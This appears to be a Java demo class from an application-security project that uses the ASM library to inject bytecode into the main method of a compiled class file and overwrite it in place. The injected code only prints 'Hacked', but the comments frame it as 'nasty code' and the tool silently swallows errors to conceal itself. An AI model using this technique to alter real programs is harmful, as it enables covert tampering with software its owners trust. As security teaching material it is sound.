package net.trollheim.appsec.utils;


import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.Opcodes;
import org.objectweb.asm.tree.*;

import java.io.*;
import java.util.List;

/**
 * Class updater, injects bytecode into main method, currently its
 */
public class ClassUpdater {

     public void update(String filename) {
        File file = new File(filename);
        try {
            ClassReader cr = new ClassReader(new FileInputStream(file));
            ClassNode classNode = new ClassNode();
            cr.accept(classNode, 0);
            //
            MethodNode mainMethod = findMain(classNode.methods);
            if (mainMethod == null) {
                //oops we didnt find main method
                return;
            }
            //Inject some nasty code
            injectCode(mainMethod);

            //Save updated class
            ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES);
            classNode.accept(cw);

            DataOutputStream dout = new DataOutputStream(new FileOutputStream(new File(filename)));
            dout.write(cw.toByteArray());
            dout.flush();
            dout.close();
        } catch (IOException e) {
            //Swallow exception as we don't want anyone know what we are doing
        }
    }

    /**
     * Injects code
     *
     * @param mainMethod main method
     */
    private void injectCode(MethodNode mainMethod) {
        AbstractInsnNode first = mainMethod.instructions.getFirst();
        mainMethod.instructions.insertBefore(first, new FieldInsnNode(Opcodes.GETSTATIC, "java/lang/System", "out", "Ljava/io/PrintStream;"));
        mainMethod.instructions.insertBefore(first, new LdcInsnNode("Hacked"));
        mainMethod.instructions.insertBefore(first, new MethodInsnNode(Opcodes.INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V"));

    }

    /**
     * Finds method by name
     *
     * @param methods list of methods from class
     * @return main method
     */
    private MethodNode findMain(List<MethodNode> methods) {
        for (MethodNode method : methods) {
            if (method.name.equals("main")) {
                return method;
            }
        }
        return null;
    }

}

